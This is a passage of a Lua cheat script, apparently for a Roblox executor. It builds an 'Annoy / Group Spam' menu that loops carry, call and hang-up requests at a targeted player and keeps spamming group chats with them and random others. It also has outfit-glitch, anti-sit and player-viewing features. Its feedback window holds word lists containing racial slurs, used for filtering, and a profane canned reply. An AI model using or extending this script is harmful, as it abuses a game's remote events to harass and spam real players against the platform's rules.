      pcall(function()
         getgenv().Send("wear_outfit_from_desc", {
            accessories = accessories,
            properties = properties
         })
      end)

      task.delay(0.10, function()
         getgenv().apply_skin_tone(getgenv().session_original_skin)
         getgenv().height_setter_busy = false
      end)
   end

   getgenv().reset_to_original_height = function()
      if getgenv().height_setter_busy then return end
      if not getgenv().session_original_height then return end

      getgenv().height_func_setter(getgenv().session_original_height)

      if getgenv().session_original_skin then
         task.delay(0.1, function()
            getgenv().apply_skin_tone(getgenv().session_original_skin)
         end)
      end

      task.delay(0.3, function()
         getgenv().session_original_height = nil
         getgenv().session_original_width = nil
         getgenv().session_original_skin = nil
         getgenv().session_active = false
      end)
   end

   getgenv().reapply_last_skin = function()
      if getgenv().last_skin_tone then
         getgenv().apply_skin_tone(getgenv().last_skin_tone)
      end
   end

   getgenv().reapply_prev_skin = function()
      if getgenv().prev_skin_tone then
         getgenv().apply_skin_tone(getgenv().prev_skin_tone)
      end
   end

   getgenv().anti_sit_func = function(toggle)
      local FL = getgenv().FlamesLibrary

      if not getgenv().Seat then
         local ok, result = pcall(require, getgenv().Game_Folder:FindFirstChild("Seat"))
         if ok and result then
            getgenv().Seat = result
         else
            return notify("Error", "Failed to load Seat module!", 5)
         end
      end

      local seat_set = FL.safe_func(getgenv().Seat and getgenv().Seat.enabled and getgenv().Seat.enabled.set)

      if toggle == true then
         if FL.is_alive("anti_sit_loop") then
            return notify("Warning", "AntiSit is already enabled!", 5)
         end

         getgenv().Not_Ever_Sitting = true
         notify("Success", "Anti-Sit is now enabled!", 5)
         show_notification("Success:", "Anti-Sit is now enabled!", "Normal")

         FL.spawn("anti_sit_loop", "spawn", function()
            while getgenv().Not_Ever_Sitting do
               fw(0)
               pcall(getgenv().Send, "stop_sitting")
            end
         end)
      elseif toggle == false then
         if not FL.is_alive("anti_sit_loop") then
            return notify("Warning", "AntiSit is not enabled!", 5)
         end

         getgenv().Not_Ever_Sitting = false
         FL.disconnect("anti_sit_loop")
         fw(0.1)
         pcall(seat_set, true)
         fw(0.1)
         notify("Success", "Sitting is now enabled!", 5)
         Phone.show_notification("Success:", "Sitting is now enabled!", "Normal")
      end
   end

   getgenv().annoyance_GUI = function()
      if CoreGui:FindFirstChild("AnnoyGUI") and CoreGui:FindFirstChild("AnnoyGUI"):IsA("ScreenGui") then
         CoreGui:FindFirstChild("AnnoyGUI").Enabled = true
         return 
      end

      getgenv().AnnoyList = getgenv().AnnoyList or {}
      getgenv().group_chatting_users = getgenv().group_chatting_users or {}
      getgenv().Creating_Groups = false

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = "AnnoyGUI"
      ScreenGui.Parent = CoreGui
      ScreenGui.ResetOnSpawn = false

      local AnnoyerGUIFrame = Instance.new("Frame")
      AnnoyerGUIFrame.Size = UDim2.new(0, 300, 0, 400)
      AnnoyerGUIFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
      AnnoyerGUIFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      AnnoyerGUIFrame.BorderSizePixel = 0
      AnnoyerGUIFrame.Parent = ScreenGui
      Instance.new("UICorner", AnnoyerGUIFrame).CornerRadius = UDim.new(0, 12)

      dragify(AnnoyerGUIFrame)

      local TitleBar = Instance.new("Frame")
      TitleBar.Size = UDim2.new(1, 0, 0, 35)
      TitleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
      TitleBar.BorderSizePixel = 0
      TitleBar.Parent = AnnoyerGUIFrame
      Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)

      local Title = Instance.new("TextLabel")
      Title.Size = UDim2.new(1, -35, 1, 0)
      Title.Position = UDim2.new(0, 10, 0, 0)
      Title.Text = "Annoy / Group Spam Menu | Made By: "..tostring(Script_Creator).."."
      Title.TextColor3 = Color3.fromRGB(255, 255, 255)
      Title.BackgroundTransparency = 1
      Title.TextXAlignment = Enum.TextXAlignment.Left
      Title.Font = Enum.Font.GothamBold
      Title.TextScaled = true
      Title.TextSize = 14
      Title.Parent = TitleBar

      local CloseBtn = Instance.new("TextButton")
      CloseBtn.Size = UDim2.new(0, 25, 0, 25)
      CloseBtn.Position = UDim2.new(1, -30, 0.5, -12)
      CloseBtn.Text = "X"
      CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
      CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
      CloseBtn.Font = Enum.Font.GothamBold
      CloseBtn.TextScaled = true
      CloseBtn.TextSize = 14
      CloseBtn.Parent = TitleBar
      Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)

      CloseBtn.MouseButton1Click:Connect(function()
         ScreenGui.Enabled = false
         getgenv().easy_click_plr = false
         getgenv().Creating_Groups = false
      end)

      local PlayerList = Instance.new("ScrollingFrame")
      PlayerList.Size = UDim2.new(1, -10, 1, -45)
      PlayerList.Position = UDim2.new(0, 5, 0, 40)
      PlayerList.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      PlayerList.BorderSizePixel = 0
      PlayerList.ScrollBarThickness = 6
      PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
      PlayerList.Parent = AnnoyerGUIFrame
      Instance.new("UICorner", PlayerList).CornerRadius = UDim.new(0, 10)

      local UIListLayout = Instance.new("UIListLayout")
      UIListLayout.Parent = PlayerList
      UIListLayout.Padding = UDim.new(0, 5)

      local function ToggleAnnoy(plr, btn)
         if getgenv().easy_click_plr and getgenv().easy_click_target == plr.Name then
            getgenv().easy_click_plr = false
            if getgenv().Toggling_Annoyance_Loop_Carry_AndCall then
               pcall(function()
                  task.cancel(getgenv().Toggling_Annoyance_Loop_Carry_AndCall)
                  getgenv().Toggling_Annoyance_Loop_Carry_AndCall = nil
               end)
            end
            btn.Text = "Annoy Off"
            btn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
         else
            getgenv().easy_click_target = plr.Name
            getgenv().easy_click_plr = true
            btn.Text = "Annoy On"
            btn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
            getgenv().Toggling_Annoyance_Loop_Carry_AndCall = getgenv().Toggling_Annoyance_Loop_Carry_AndCall or task.spawn(function()
               while getgenv().easy_click_plr and getgenv().easy_click_target == plr.Name do
                  fw(0)
                  getgenv().Send("request_carry", plr.Name)
                  fw(0)
                  getgenv().Send("request_call", plr.Name)
                  fw(0)
                  getgenv().Send("end_call", plr.Name)
               end
            end)
         end
      end

      local function ToggleGroupSpam(plr, btn)
         if table.find(getgenv().group_chatting_users, plr.Name) then
            table.remove(getgenv().group_chatting_users, table.find(getgenv().group_chatting_users, plr.Name))
            if getgenv().Always_Creating_TheGroups_Loop_Task then
               task.cancel(getgenv().Always_Creating_TheGroups_Loop_Task)
               getgenv().Always_Creating_TheGroups_Loop_Task = nil
            end
            btn.Text = "Group Spam Off"
            btn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            if #getgenv().group_chatting_users == 0 then
               getgenv().Creating_Groups = false
            end
         else
            table.insert(getgenv().group_chatting_users, plr.Name)
            btn.Text = "Group Spam On"
            btn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
            getgenv().Creating_Groups = true
            getgenv().Always_Creating_TheGroups_Loop_Task = getgenv().Always_Creating_TheGroups_Loop_Task or task.spawn(function()
               while getgenv().Creating_Groups == true do
                  wait(.4)
                  local userIds = {}

                  for _, name in ipairs(getgenv().group_chatting_users) do
                     local success, userId = pcall(function()
                        return Players:GetUserIdFromNameAsync(name)
                     end)
                     if success and userId then
                        table.insert(userIds, userId)
                     end
                  end

                  if #userIds == 1 then
                     local others = {}
                     for _, other in ipairs(Players:GetPlayers()) do
                        if other.Name ~= getgenv().group_chatting_users[1] and other ~= LocalPlayer then
                           table.insert(others, other)
                        end
                     end

                     for i = #others, 2, -1 do
                        local j = math.random(i)
                        others[i], others[j] = others[j], others[i]
                     end

                     for i = 1, math.min(3, #others) do
                        table.insert(userIds, others[i].UserId)
                     end
                  end

                  if #userIds > 0 then
                     getgenv().Get("new_group", userIds)
                  end
               end
            end)
         end
      end

      local function createPlayerEntry(plr)
         if plr == LocalPlayer then return end

         local Container = Instance.new("Frame")
         Container.Size = UDim2.new(1, -5, 0, 110)
         Container.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
         Container.BorderSizePixel = 0
         Container.Parent = PlayerList
         Instance.new("UICorner", Container).CornerRadius = UDim.new(0, 8)

         local NameLabel = Instance.new("TextLabel")
         NameLabel.Size = UDim2.new(1, -10, 0, 20)
         NameLabel.Position = UDim2.new(0, 5, 0, 5)
         NameLabel.Text = "DisplayName: " .. plr.DisplayName
         NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         NameLabel.BackgroundTransparency = 1
         NameLabel.TextXAlignment = Enum.TextXAlignment.Left
         NameLabel.Font = Enum.Font.Gotham
         NameLabel.TextSize = 13
         NameLabel.Parent = Container

         local UserLabel = Instance.new("TextLabel")
         UserLabel.Size = UDim2.new(1, -10, 0, 20)
         UserLabel.Position = UDim2.new(0, 5, 0, 25)
         UserLabel.Text = "Username: " .. plr.Name
         UserLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
         UserLabel.BackgroundTransparency = 1
         UserLabel.TextXAlignment = Enum.TextXAlignment.Left
         UserLabel.Font = Enum.Font.Gotham
         UserLabel.TextSize = 12
         UserLabel.Parent = Container

         local IdLabel = Instance.new("TextLabel")
         IdLabel.Size = UDim2.new(1, -10, 0, 20)
         IdLabel.Position = UDim2.new(0, 5, 0, 45)
         IdLabel.Text = "UserId: " .. tostring(plr.UserId)
         IdLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
         IdLabel.BackgroundTransparency = 1
         IdLabel.TextXAlignment = Enum.TextXAlignment.Left
         IdLabel.Font = Enum.Font.Gotham
         IdLabel.TextSize = 12
         IdLabel.Parent = Container

         local AnnoyButton = Instance.new("TextButton")
         AnnoyButton.Size = UDim2.new(0, 110, 0, 20)
         AnnoyButton.Position = UDim2.new(0, 10, 0, 70)
         AnnoyButton.Text = "Annoy Off"
         AnnoyButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
         AnnoyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
         AnnoyButton.Font = Enum.Font.GothamBold
         AnnoyButton.TextScaled = true
         AnnoyButton.TextSize = 13
         AnnoyButton.Parent = Container
         Instance.new("UICorner", AnnoyButton).CornerRadius = UDim.new(0, 6)

         AnnoyButton.MouseButton1Click:Connect(function()
            ToggleAnnoy(plr, AnnoyButton)
         end)

         local GroupButton = Instance.new("TextButton")
         GroupButton.Size = UDim2.new(0, 110, 0, 20)
         GroupButton.Position = UDim2.new(0, 140, 0, 70)
         GroupButton.Text = "Group Spam Off"
         GroupButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
         GroupButton.TextColor3 = Color3.fromRGB(255, 255, 255)
         GroupButton.Font = Enum.Font.GothamBold
         GroupButton.TextScaled = true
         GroupButton.TextSize = 13
         GroupButton.Parent = Container
         Instance.new("UICorner", GroupButton).CornerRadius = UDim.new(0, 6)

         GroupButton.MouseButton1Click:Connect(function()
            ToggleGroupSpam(plr, GroupButton)
         end)

         if getgenv().easy_click_plr and getgenv().easy_click_target == plr.Name then
            AnnoyButton.Text = "Annoy On"
            AnnoyButton.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
         end

         if table.find(getgenv().group_chatting_users, plr.Name) then
            GroupButton.Text = "Group Spam On"
            GroupButton.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
         end

         PlayerList.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
      end

      local function refreshPlayerList()
         for _, child in ipairs(PlayerList:GetChildren()) do
            if child:IsA("Frame") then
               child:Destroy()
            end
         end
         for _, plr in ipairs(Players:GetPlayers()) do
            createPlayerEntry(plr)
         end
      end

      if not getgenv().RefreshPlayer_ListAdded_Conn then
         getgenv().RefreshPlayer_ListAdded_Conn = true

         Players.PlayerAdded:Connect(refreshPlayerList)
         Players.PlayerRemoving:Connect(refreshPlayerList)
      end

      refreshPlayerList()
   end

   local Hum = getgenv().Humanoid
   local HD = Hum:FindFirstChild("HumanoidDescription")
   getgenv().GlitchIDs = {
      Shirts = {6028801590, 11595159513},
      Pants  = {6028804735, 11595172734}
   }

   getgenv().isWearing = function(desc, slot, id)
      return desc and tostring(desc[slot]) == tostring(id)
   end

   getgenv().forceEquip = function(slot, id)
      if not isWearing(HD, slot, id) then
         getgenv().Get("code", id, slot)
      end
   end

   getgenv().forceUnequip = function(slot, id)
      if isWearing(HD, slot, id) then
         getgenv().Get("wear", id, slot)
      end
   end

   getgenv().feedback_GUI = function()
      if getgenv().FeedbackCooldown then
         return notify("Warning", "You must wait before sending a Feedback request again! (" .. (getgenv().FeedbackTimeLeft or 0) .. "s left)", 5)
      end
      if parent_gui:FindFirstChild("FeedbackUI") then
         return notify("Error", "Feedback-V2 is already loaded, close it first!", 5)
      end

      local ScreenGui = Instance.new("ScreenGui")
      getgenv().FeedbackGUI_V2_ScreenGui = ScreenGui
      ScreenGui.Name = "FeedbackUI"
      ScreenGui.ResetOnSpawn = false
      ScreenGui.Parent = parent_gui

      local Frame = Instance.new("Frame")
      Frame.Name = "FeedbackFrame"
      Frame.Size = UDim2.new(0, 450, 0, 275) -- should work for all platforms.
      Frame.Position = UDim2.new(0.5, -175, 0.5, -100)
      Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      Frame.BorderSizePixel = 0
      Frame.Active = true
      Frame.Draggable = true
      Frame.Parent = ScreenGui

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 12)
      UICorner.Parent = Frame

      local UIStroke = Instance.new("UIStroke")
      UIStroke.Thickness = 2
      UIStroke.Color = Color3.fromRGB(90, 90, 90)
      UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
      UIStroke.Parent = Frame

      local Title = Instance.new("TextLabel")
      Title.Size = UDim2.new(1, -40, 0, 40)
      Title.Position = UDim2.new(0, 10, 0, 0)
      Title.BackgroundTransparency = 1
      Title.Text = "🔥 Flames Feedback - V2 🔥"
      Title.TextScaled = true
      Title.TextColor3 = Color3.fromRGB(255, 255, 255)
      Title.Font = Enum.Font.GothamBold
      Title.TextSize = 20
      Title.TextXAlignment = Enum.TextXAlignment.Left
      Title.Parent = Frame

      local CloseBtn = Instance.new("TextButton")
      CloseBtn.Size = UDim2.new(0, 30, 0, 30)
      CloseBtn.Position = UDim2.new(1, -29, 0, -2)
      CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
      CloseBtn.Text = "X"
      CloseBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
      CloseBtn.Font = Enum.Font.GothamBold
      CloseBtn.TextSize = 18
      CloseBtn.Parent = Frame

      local CloseCorner = Instance.new("UICorner")
      CloseCorner.CornerRadius = UDim.new(0, 6)
      CloseCorner.Parent = CloseBtn

      CloseBtn.MouseButton1Click:Connect(function()
         if ScreenGui then
            ScreenGui:Destroy()
            if getgenv().FeedbackGUI_V2_ScreenGui then
               getgenv().FeedbackGUI_V2_ScreenGui = nil
            end
         elseif not ScreenGui then
            if getgenv().FeedbackGUI_V2_ScreenGui then
               getgenv().FeedbackGUI_V2_ScreenGui:Destroy()
               getgenv().FeedbackGUI_V2_ScreenGui = nil
            end
         elseif parent_gui:FindFirstChild("FeedbackUI") then
            parent_gui:WaitForChild("FeedbackUI", 9e9):Destroy()
            if getgenv().FeedbackGUI_V2_ScreenGui then
               getgenv().FeedbackGUI_V2_ScreenGui = nil
            end
         end
      end)

      local TypeLabel = Instance.new("TextLabel")
      TypeLabel.Size = UDim2.new(1, -20, 0, 20)
      TypeLabel.Position = UDim2.new(0, 10, 0, 155)
      TypeLabel.BackgroundTransparency = 1
      TypeLabel.Text = "Please select a Feedback type!"
      TypeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
      TypeLabel.Font = Enum.Font.GothamSemibold
      TypeLabel.TextSize = 14
      TypeLabel.TextScaled = true
      TypeLabel.TextXAlignment = Enum.TextXAlignment.Left
      TypeLabel.Parent = Frame

      local TextBox = Instance.new("TextBox")
      TextBox.Size = UDim2.new(1, -20, 0, 100)
      TextBox.Position = UDim2.new(0, 10, 0, 50)
      TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      TextBox.Text = ""
      TextBox.PlaceholderText = "Type your feedback here..."
      TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
      TextBox.Font = Enum.Font.Gotham
      TextBox.TextSize = 16
      TextBox.ClearTextOnFocus = false
      TextBox.TextWrapped = true
      TextBox.MultiLine = true
      TextBox.Parent = Frame

      local TBcorner = Instance.new("UICorner")
      TBcorner.CornerRadius = UDim.new(0, 8)
      TBcorner.Parent = TextBox

      getgenv().bad_phrases = {
         "this script is ass",
         "your script is shit",
         "fuck you guys",
         "screw you guys",
         "fuck your script",
         "you're a nigga",
         "you're a nigger",
         "this script sucks",
         "your script sucks",
         "this scripts ass",
         "your scripts ass",
         "this scripts shit",
         "your scripts shit"
      }
      getgenv().Greetings = {
         "hi", "hello", "hey", "wsp", "wsg", "wassup", "wasgood", "was gd", "was good", "yo", "greetings", "whats crackin", "what's crackin", "what's good", "what's up", "whats good", "whats up"
      }
      getgenv().discordWords = {
         "discord", "dc", "disc", "dsc", "dcord", "disco"
      }
      getgenv().serverWords = {
         "server", "serv" -- shouldn't put "srv", because it could be accidentally tripped up, and we don't need it.
      }
      getgenv().userWords = {
         "user", "username", "displayname", "display", "name"
      }
      getgenv().offensiveWords = {
         "nigga", "nigger", "n1gger", "nig", "niglet", "kkk", "beaner", "retard", "gay", "slut", "whore", "hoe", "bitch"
      }
      getgenv().premiumHouseWords = { -- shut up, camelCase actually looks good here tbh with these, a couple of them aren't camelCase though, things like "user_words" don't look good in snake_case or NormalCase.
         "house", "home" -- don't know what else to put tbh.
      }

      local function get_smart_tip_func(message)
         message = message:lower()

         if message:match("give%s+admin") then
            return "To admin someone, make sure they're your friend, and have them rejoin you (it's automatic), and then they can do ;cmds in chat (it will make you chat)."
         end

         if message:match("%f[%w]open%f[%W]") or message:match("won't open") or message:match("cant open") or message:match("can't open") or message:match("doesn't open") or message:match("doesnt open") or message:match("unable to open") or message:match("can't run") or message:match("will not run") or message:match("will not load") then
            return "If the script did not load, try rejoining and re-executing it, you may have been lagging when loading the script."
         end

         if (message:find("cmds") or message:find("commands")) and message:find("use") then
            return "Use: "..tostring(getgenv().AdminPrefix or loadPrefix()).."cmds in chat to view all commands."
         end

         if message:find("ur user") or message:find("your user") or message:find("whats ur user") or message:find("what's your user") or message:find("user name") then
            return "My current Roblox username is: CIippedByAura or L0CKED_1N1"
         end

         if message:find("copy") and (message:find("fit") or message:find("outfit") or message:find("avatar")) then
            return "To copy someones outfit, use the command: "..tostring(getgenv().AdminPrefix or loadPrefix()).."copy PlayersUserHere and it will copy their avatar for you."
         end

         if message:find("10/10") then
            return "Thank you! (If you we're rating my script, this was caught with auto-detection)."
         end

         for _, phrase in ipairs(getgenv().bad_phrases) do
            if message:find(phrase, 1, true) then
               return "Then stop using scripts, the fuck?!"
            end
         end

         local flags = {}

         for _, list in ipairs({
            { getgenv().discordWords, "discord" },
            { getgenv().serverWords, "server" },
            { getgenv().userWords, "user" },
            { getgenv().offensiveWords, "offensive" }
         }) do
            for _, word in ipairs(list[1]) do
               if message:find(word) then
                  flags[list[2]] = true
                  break
               end
            end
         end

         if flags.discord and flags.user then
            return "I have my Discord friend requests off, sorry!"
         end

         if flags.discord and flags.server then
            return "I do not have or want a Discord server."
         end

         if flags.offensive then
            return "That is offensive, what you send stays in the Feedback logs, I can blacklist you for being offensive you know, just a warning."
         end

         for _, word in ipairs(getgenv().Greetings) do
            if message:match("%f[%a]"..word.."%f[%A]") then
               return "Hello there, "..tostring(getgenv().LocalPlayer.DisplayName).."!"
            end
         end

         return nil
      end

      local function show_smart_tip_ScreenGui(message)
         local TipGui = Instance.new("ScreenGui")
         TipGui.Name = "SmartTipGUI"
         TipGui.ResetOnSpawn = false
         TipGui.Parent = parent_gui

         local Frame = Instance.new("Frame")
         Frame.Size = UDim2.new(0, 420, 0, 180)
         Frame.Position = UDim2.new(0.5, -210, 0.5, -90)
         Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
         Frame.BorderSizePixel = 0
         Frame.Parent = TipGui
         Frame.Active = true
         Frame.Draggable = true

         local Corner = Instance.new("UICorner")
         Corner.CornerRadius = UDim.new(0, 12)
         Corner.Parent = Frame

         local Text = Instance.new("TextLabel")
         Text.Size = UDim2.new(1, -20, 1, -60)
         Text.Position = UDim2.new(0, 10, 0, 10)
         Text.BackgroundTransparency = 1
         Text.TextColor3 = Color3.fromRGB(255, 255, 255)
         Text.TextWrapped = true
         Text.TextSize = 16
         Text.Font = Enum.Font.GothamSemibold
         Text.Text = message
         Text.Parent = Frame

         local Close = Instance.new("TextButton")
         Close.Size = UDim2.new(1, -20, 0, 40)
         Close.Position = UDim2.new(0, 10, 1, -45)
         Close.BackgroundColor3 = Color3.fromRGB(65, 120, 255)
         Close.Text = "Close"
         Close.TextColor3 = Color3.fromRGB(255, 255, 255)
         Close.Font = Enum.Font.GothamBold
         Close.TextSize = 18
         Close.Parent = Frame

         local CC = Instance.new("UICorner")
         CC.CornerRadius = UDim.new(0, 8)
         CC.Parent = Close

         Close.MouseButton1Click:Connect(function()
            TipGui:Destroy()
         end)

         return TipGui
      end

      local selected_type = "feedback"
      local type_buttons = {}
      local selected_button = nil
      local function update_button_visuals()
         for _, data in pairs(type_buttons) do
            local stroke = data.stroke

            if data.button == selected_button then
               stroke.Color = Color3.fromRGB(60, 200, 120) -- green glow, for perfection lol.
               stroke.Thickness = 3
               stroke.Transparency = 0
            else
               stroke.Color = Color3.fromRGB(0,0,0)
               stroke.Thickness = 1
               stroke.Transparency = 0.5
            end
         end
      end

      local function create_type_button(text, color, pos_x, pos_y, type_name, size_main)
         local btn = Instance.new("TextButton")
         btn.Size = size_main or UDim2.new(0.25, -6, 0, 25)
         btn.Position = UDim2.new(pos_x, 8, 0, pos_y)
         btn.BackgroundColor3 = color
         btn.Text = text
         btn.TextScaled = true
         btn.TextColor3 = Color3.fromRGB(255,255,255)
         btn.Font = Enum.Font.GothamBold
         btn.TextSize = 14
         btn.Parent = Frame

         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(0,6)
         corner.Parent = btn

         local stroke = Instance.new("UIStroke")
         stroke.Thickness = 1
         stroke.Color = Color3.fromRGB(80, 255, 160)
         stroke.Transparency = 0.2
         stroke.Parent = btn

         table.insert(type_buttons, {
            button = btn,
            stroke = stroke,
            type = type_name
         })

         btn.MouseButton1Click:Connect(function()
            if selected_button == btn then return end

            selected_type = type_name
            selected_button = btn

            TypeLabel.Text = "Selected: " .. type_name:gsub("^%l", string.upper)
            TypeLabel.TextColor3 = Color3.fromRGB(80, 255, 160)
            update_button_visuals()
         end)

         return btn
      end

      local btn1 = create_type_button("👤 Feedback 👤", Color3.fromRGB(70,130,250), 0, 175, "feedback", UDim2.new(0.25, -6, 0, 25))
      local btn2 = create_type_button("⚠️ Issue ⚠️", Color3.fromRGB(200,180,0), 0.25, 175, "issue", UDim2.new(0.25, -6, 0, 25))
      local btn3 = create_type_button("❗ User Report ❗", Color3.fromRGB(0,0,0), 0.5, 175, "report", UDim2.new(0.25, -6, 0, 25))
      local btn4 = create_type_button("🕷️ Bug 🕷️", Color3.fromRGB(165,42,42), 0.75, 175, "bug", UDim2.new(0.239999995, -6, 0, 25))

      selected_button = btn1 -- will default selection for user comfort, so they know to pick one.
      update_button_visuals()
      fw(0.1)
      local SendBtn = Instance.new("TextButton")
      SendBtn.Size = UDim2.new(1, -20, 0, 40)
      SendBtn.Position = UDim2.new(0, 10, 1, -45)
      SendBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 250)
      SendBtn.Text = "Send Feedback"
      SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
      SendBtn.Font = Enum.Font.GothamBold
      SendBtn.TextSize = 18
      SendBtn.TextScaled = true
      SendBtn.Parent = Frame

      local CooldownLabel = Instance.new("TextLabel")
      CooldownLabel.Size = UDim2.new(1, 0, 0, 20)
      CooldownLabel.Position = UDim2.new(0, 0, 1, -20)
      CooldownLabel.BackgroundTransparency = 1
      CooldownLabel.Text = ""
      CooldownLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
      CooldownLabel.Font = Enum.Font.Gotham
      CooldownLabel.TextSize = 14
      CooldownLabel.TextScaled = true
      CooldownLabel.Parent = Frame

      local SendCorner = Instance.new("UICorner")
      SendCorner.CornerRadius = UDim.new(0, 8)
      SendCorner.Parent = SendBtn

      SendBtn.MouseButton1Click:Connect(function()
         local msg = TextBox.Text

         if msg == "" or msg:match("^%s*$") then
            SendBtn.Text = "Enter feedback text!"
            task.wait(1)
            SendBtn.Text = "Send Feedback"
            return 
         end

         local lower_msg = msg:lower()

         for _, word in ipairs(getgenv().offensiveWords) do
            if lower_msg:find(word, 1, true) then
               TypeLabel.Text = "Message contains blocked/offensive content!"
               TypeLabel.TextColor3 = Color3.fromRGB(255, 80, 80)

               SendBtn.Text = "Blocked (Blatant Racism)."
               task.wait(1.2)
               SendBtn.Text = "Send Feedback"
               return
            end
         end

         for _, phrase in ipairs(getgenv().bad_phrases) do
            if lower_msg:find(phrase, 1, true) then
               TypeLabel.Text = "Message contains disallowed phrases!"
               TypeLabel.TextColor3 = Color3.fromRGB(255, 80, 80)

               SendBtn.Text = "Blocked (Hatred towards script)."
               task.wait(1.2)
               SendBtn.Text = "Send Feedback"
               return
            end
         end

         local tip = get_smart_tip_func(msg)
         if tip then
            show_smart_tip_ScreenGui(tip)
         end

         pcall(function()
            getgenv().Send_Main_Feedback(getgenv().LocalPlayer, msg, selected_type)
         end)

         getgenv().FeedbackCooldown = true
         getgenv().FeedbackTimeLeft = 60
         getgenv().FeedbackCooldown_Has_Been_Set_Loop_Task = getgenv().FeedbackCooldown_Has_Been_Set_Loop_Task or task.spawn(function()
            while getgenv().FeedbackTimeLeft > 0 do
               CooldownLabel.Text = "Cooldown: " .. tostring(getgenv().FeedbackTimeLeft) .. "s"
               task.wait(1)
               getgenv().FeedbackTimeLeft = (getgenv().FeedbackTimeLeft or 0) - 1
            end
            CooldownLabel.Text = ""
         end)

         task.delay(60, function()
            getgenv().FeedbackCooldown = false
         end)

         ScreenGui:Destroy()
      end)
   end

   local humanoid = getgenv().Humanoid or getgenv().Character and getgenv().Character:FindFirstChildOfClass("Humanoid") or get_human(LocalPlayer or game.Players.LocalPlayer)
   local applied = humanoid:GetAppliedDescription()
   local Old_Shirt = applied.Shirt
   local Old_Pants = applied.Pants

   getgenv().glitch_outfit = function(toggle)
      if toggle == true then
         if getgenv().Glitching_Outfit then
            return getgenv().notify("Warning", "Glitch Outfit is already enabled.", 5)
         end
         getgenv().Glitching_Outfit = true

         task.spawn(function()
            while getgenv().Glitching_Outfit == true do
               fw(0)
               for _, shirtId in ipairs(GlitchIDs.Shirts) do
                  forceEquip("Shirt", shirtId)
                  wait()
                  forceUnequip("Shirt", shirtId)
               end
               fw(0.1)
               for _, pantsId in ipairs(GlitchIDs.Pants) do
                  forceEquip("Pants", pantsId)
                  wait()
                  forceUnequip("Pants", pantsId)
               end
            end
         end)
      else
         if not getgenv().Glitching_Outfit then
            return getgenv().notify("Warning", "Glitch Outfit is not enabled.", 5)
         end

         getgenv().Glitching_Outfit = false
         while getgenv().Glitching_Outfit do
            wait()
         end

         task.spawn(function()
            wait(0.5)
            getgenv().Send("code", Old_Shirt, "Shirt")
            wait()
            getgenv().Send("code", Old_Pants, "Pants")
         end)
      end
   end

   function check_friends()
      for _, v in ipairs(getgenv().Players:GetPlayers()) do
         if v ~= getgenv().LocalPlayer and v:IsFriendsWith(getgenv().LocalPlayer.UserId) then
            alreadyCheckedUser(v)
         end
      end
   end

   function auto_add_friends()
      for _, v in ipairs(getgenv().Players:GetPlayers()) do
         if v ~= getgenv().LocalPlayer and v:IsFriendsWith(getgenv().LocalPlayer.UserId) then
            check_friends()
            addPlayerToScriptWhitelistTable(v)
         end
      end
   end

   auto_add_friends()

   local originalCFrame
   local originalCameraType
   if getgenv().PlayerControls == nil then
      local PlayerModule = require(getgenv().PlayerScripts:WaitForChild("PlayerModule"))
      getgenv().PlayerControls = PlayerModule:GetControls()
   end

   getgenv().Viewing_Plr_Tbl = getgenv().Viewing_Plr_Tbl or {}
   getgenv().viewTarget = getgenv().viewTarget or function(player)
      if getgenv().Viewing_A_Player then
         if getgenv().Viewing_Plr_Tbl[player.Name] then
            return notify("Error","You're already viewing: "..player.DisplayName,5)
         end
         return notify("Error","You're already viewing a Player.",5)
      end

      if not player or not player.Character then
         return notify("Error","Invalid player.",5)
      end

      local char = getgenv().get_char(player)
      local hum = get_human(player) or char:FindFirstChildWhichIsA("Humanoid")
      if not hum then
         return notify("Error","Player has no humanoid.",5)
      end

      local root = get_root(player) or hum.RootPart or char:FindFirstChild("HumanoidRootPart")

      getgenv().Camera.CameraSubject = hum
      getgenv().Viewing_A_Player = true

      getgenv().Viewing_Plr_Tbl[player.Name] = {
         Name = player.Name,
         DisplayName = player.DisplayName,
         UserId = player.UserId,
         Character = char,
         Humanoid = hum,
         HumanoidRootPart = root
      }
   end

   getgenv().unview_player = getgenv().unview_player or function()
      local genv = getgenv()

      if not genv.Viewing_A_Player then
         return genv.notify("Error", "You're not viewing anyone.", 5)
      end

      local hum = genv.Humanoid
      local char = genv.Character
      local subject =
         hum
         or (char and char:FindFirstChildWhichIsA("Humanoid"))
         or char

      if subject and genv.Camera then
         genv.Camera.CameraSubject = subject
      elseif not genv.Camera then
         workspace.CurrentCamera.CameraSubject = subject
      end

